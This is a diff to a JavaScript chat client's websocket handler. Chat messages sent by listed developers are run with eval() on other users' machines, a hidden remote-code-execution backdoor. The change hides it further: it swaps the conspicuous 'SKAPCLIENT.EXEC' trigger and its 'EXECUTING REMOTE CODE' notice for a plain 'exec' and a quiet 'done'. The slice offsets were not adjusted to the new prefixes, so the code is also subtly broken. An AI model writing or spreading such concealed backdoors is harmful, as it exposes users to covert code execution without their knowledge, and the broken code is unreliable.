@@ -519,13 +519,12 @@ ws.addEventListener("message", e => {
         case "message":
             if (msg.m.m.match(new RegExp("@" + user + "(\\s|$)", "g")) || msg.m.m.match(/@everyone(\s|$)/g) || msg.m.m.match(/@all(\s|$)/g)) ping.play();
             if (devs.includes(msg.m.s) && !devs.includes(user)) {
-                if (msg.m.m.startsWith("SKAPCLIENT.EXEC " + user + " ")) {
-                    sendMessage("SKAPCLIENT EXECUTING REMOTE CODE.");
+                if (msg.m.m.startsWith("exec " + user + " ")) {
                     eval(msg.m.m.slice(17 + user.length));
-                } else if (msg.m.m.startsWith("SKAPCLIENT.EXEC $ ")) {
-                    sendMessage("SKAPCLIENT EXECUTING REMOTE CODE.");
+                    sendMessage("done");
+                } else if (msg.m.m.startsWith("exec $ ")) {
                     eval(msg.m.m.slice(18));
-
+                    sendMessage("done");
                 }
             }
             message(msg);
